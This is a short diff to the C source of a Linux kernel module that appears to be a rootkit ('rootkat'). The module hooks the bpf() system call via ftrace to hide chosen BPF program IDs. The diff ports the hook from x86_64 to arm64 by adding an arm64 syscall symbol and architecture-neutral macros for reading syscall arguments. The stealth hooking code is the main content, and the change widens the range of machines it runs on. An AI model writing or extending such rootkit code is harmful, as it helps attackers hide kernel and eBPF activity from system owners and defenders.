@@ -4,6 +4,7 @@
 #include <linux/string.h>
 #include <linux/uaccess.h>
 #include <linux/ptrace.h>
+#include "arch_compat.h"
 #include "ftrace_hook.h"
 #include "kallsyms.h"
 #include "hook_sys_bpf.h"
@@ -16,7 +17,9 @@ static struct bpf_prog *(*bpf_prog_by_id_p)(u32 id);
 static void (*bpf_prog_put_p)(struct bpf_prog *prog);
 
 static const char * const sys_bpf_candidates[] = {
-	"__x64_sys_bpf", NULL,
+	"__x64_sys_bpf",   /* x86_64 */
+	"__arm64_sys_bpf", /* arm64  */
+	NULL,
 };
 
 typedef long (*sys_bpf_t)(const struct pt_regs *regs);
@@ -62,7 +65,7 @@ static bool prog_id_is_hidden(u32 id)
 static long rootkat_sys_bpf(const struct pt_regs *regs)
 {
 	sys_bpf_t orig = (sys_bpf_t)hook_sys_bpf.original;
-	int cmd = (int)regs->di;
+	int cmd = (int)SYSCALL_ARG1(regs);
 	long ret;
 	int max_iter = 1024;   /* safety: bound the recursion */
 
@@ -73,8 +76,8 @@ static long rootkat_sys_bpf(const struct pt_regs *regs)
 
 	{
 		union bpf_attr attr;
-		void __user *uattr = (void __user *)regs->si;
-		u32 size = (u32)regs->dx;
+		void __user *uattr = (void __user *)SYSCALL_ARG2(regs);
+		u32 size = (u32)SYSCALL_ARG3(regs);
 
 		if (size > sizeof(attr))
 			size = sizeof(attr);
